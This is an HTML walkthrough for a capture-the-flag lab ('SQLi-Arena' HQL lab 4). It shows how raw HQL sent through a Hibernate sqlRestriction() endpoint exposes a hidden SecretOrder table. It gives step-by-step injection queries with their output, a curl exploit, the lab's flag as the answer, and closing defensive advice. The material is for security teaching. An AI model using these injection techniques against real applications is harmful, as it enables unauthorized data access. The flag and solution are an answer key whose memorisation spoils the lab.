<!-- Introduction -->
<p>
    The Order Management system has two interfaces: a structured Criteria API filter and an
    "advanced" SQL Restriction feature. The SQL Restriction passes user input directly
    to the HQL execution engine, enabling arbitrary HQL query execution. This allows
    accessing the <code>SecretOrder</code> entity containing the flag.
</p>

<h4>Step 1: Normal Order Query (Structured Filter)</h4>
<p>Use the structured filter to query orders by customer ID.</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Criteria Query</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Entity: </span>Order<br>
        <span class="prompt">Field: </span>customer_id &nbsp; <span class="prompt">Op: </span>eq &nbsp; <span class="prompt">Value: </span>1<br>
        <span class="prompt">HQL: </span>FROM Order o WHERE 1=1 AND o.customerId = 1 ORDER BY o.amount ASC<br>
        <span class="prompt">Result: </span>3 rows returned<br><br>
        | id | customerId | product       | amount  | status    |<br>
        |----|------------|---------------|---------|-----------|<br>
        | 2  | 1          | Wireless Mouse| 29.99   | DELIVERED |<br>
        | 3  | 1          | USB-C Hub     | 49.99   | SHIPPED   |<br>
        | 1  | 1          | Laptop Pro 15 | 1299.99 | DELIVERED |
    </div>
</div>

<h4>Step 2: Test SQL Restriction with Normal Input</h4>
<p>The "Advanced Filter" passes input to the <code>/api/lab4/secret</code> endpoint which executes arbitrary HQL.</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. SQL Restriction Test</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">SQL Restriction: </span>FROM Order<br>
        <span class="prompt">Result: </span>10 order rows returned (executes as raw HQL!)
    </div>
</div>

<h4>Step 3: Discover Hidden Entity via Error</h4>
<p>Try querying a non-existent entity to trigger an error. Then try common names like SecretOrder.</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Entity Discovery</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">SQL Restriction: </span>FROM FakeEntity<br>
        <span class="prompt">Error: </span>UnknownEntityException: Could not resolve root entity 'FakeEntity'<br><br>
        <span class="prompt">SQL Restriction: </span>FROM SecretOrder<br>
        <span class="prompt">Result: </span>3 rows with secretFlag column!
    </div>
</div>

<h4>Step 4: Extract Flag from SecretOrder</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Flag Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">SQL Restriction: </span>FROM SecretOrder<br>
        <span class="prompt">Notice: </span>Restriction bypassed via sqlRestriction()<br><br>
        <span class="prompt">Result: </span><br>
        | id | customerId | product         | amount | status     | secretFlag                          |<br>
        |----|------------|-----------------|--------|------------|-------------------------------------|<br>
        | 1  | 999        | FLAG_CONTAINER  | 0      | CLASSIFIED | <strong>FLAG{hq_cr1t3r14_4p1_byp4ss}</strong> |<br>
        | 2  | 999        | DECOY_1         | 0      | CLASSIFIED | NOT_THE_FLAG                        |<br>
        | 3  | 999        | DECOY_2         | 0      | CLASSIFIED | ALSO_NOT_THE_FLAG                   |
    </div>
</div>

<h4>Step 5: Targeted Extraction (Optional)</h4>
<p>Filter for only the real flag using a WHERE clause:</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Filtered Query</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">SQL Restriction: </span>FROM SecretOrder WHERE secretFlag LIKE '%FLAG{%'<br>
        <span class="prompt">Result: </span>1 row<br><br>
        | id | customerId | product        | amount | status     | secretFlag                          |<br>
        |----|------------|----------------|--------|------------|-------------------------------------|<br>
        | 1  | 999        | FLAG_CONTAINER | 0      | CLASSIFIED | <strong>FLAG{hq_cr1t3r14_4p1_byp4ss}</strong> |
    </div>
</div>

<h4>Step 6: Submit the Flag</h4>
<p>
    Copy the flag: <code>FLAG{hq_cr1t3r14_4p1_byp4ss}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://target/SQLi-Arena/hql/lab4" -d "query_type=sql_restriction" \<br> --data-urlencode "sql_restriction=FROM SecretOrder"
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> Hibernate's <code>Restrictions.sqlRestriction()</code>
    is extremely dangerous: it passes raw SQL/HQL directly to the query engine, completely
    bypassing Hibernate's parameterization. In this lab, the "Advanced Filter" endpoint
    accepts arbitrary HQL, allowing the attacker to query any entity including
    <code>SecretOrder</code> with its hidden <code>secretFlag</code> field. Defense: never
    expose <code>sqlRestriction()</code> to user input, use typed Criteria restrictions
    (<code>Restrictions.eq()</code>, <code>Restrictions.like()</code>), and validate all
    query parameters against allowlists.
</div>
